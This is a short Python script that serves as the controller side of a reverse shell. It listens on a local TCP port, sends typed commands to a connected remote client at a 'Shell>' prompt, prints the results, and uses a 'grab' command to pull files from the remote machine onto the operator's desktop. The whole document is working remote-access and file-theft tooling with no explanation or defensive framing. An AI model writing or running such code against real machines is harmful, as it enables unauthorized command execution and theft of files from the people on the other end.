import socket


def transfer(conn, command):

    conn.send(command.encode())
    FileSize = conn.recv(1024)
    bits = conn.recv(int(FileSize))

    if bits == b'Path/FileAccessError':
        print("[-]Unable to find out the File")

    elif b'ErrorTransferringFile' in bits:
        print("[-]Error Transferring File")

    else:
        filename = input("Input File Name: ")
        f = open(r'C:\Users\Shawqi\Desktop\ ' + filename, 'wb')
        f.write(bits)
        print("[+]Transfer completed")
        f.close()





def connect():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', 8888)) 
    server.listen(1)
    conn, addr = server.accept()

    print("connected to the address", addr)

    while True:
        command = input("Shell> ")

        if command == "terminate":
            conn.send('terminate'.encode())
            conn.close()
            break
        
        if command == "exit" or command == "exit()":
            conn.send('exit'.encode())
            conn.close()
            break
        
        elif 'grab' in command:
            transfer(conn, command)
            
        else:
            conn.send(command.encode('utf-8'))
            if command != 'cd..' and command != 'cd ..' and command != 'cd':
                print(conn.recv(2048).decode('utf-8'))
            print(conn.recv(2048).decode('utf-8'))


def main():
    connect()


main()
